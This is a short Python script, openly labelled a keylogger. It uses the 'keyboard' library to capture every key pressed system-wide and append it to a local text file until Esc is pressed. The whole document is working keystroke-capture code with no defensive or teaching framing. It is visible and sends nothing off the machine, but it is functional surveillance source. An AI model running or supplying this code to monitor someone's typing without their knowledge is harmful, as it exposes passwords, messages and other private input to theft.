import keyboard

def log_keystrokes(event):
    key = event.name
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]\n"
        else:
            key = f"[{key.upper()}]"
    with open("keystrokes_log.txt", "a") as f:
        f.write(key)

keyboard.on_release(log_keystrokes)

print("Keylogger is running. Press 'Esc' to exit.")

keyboard.wait("esc")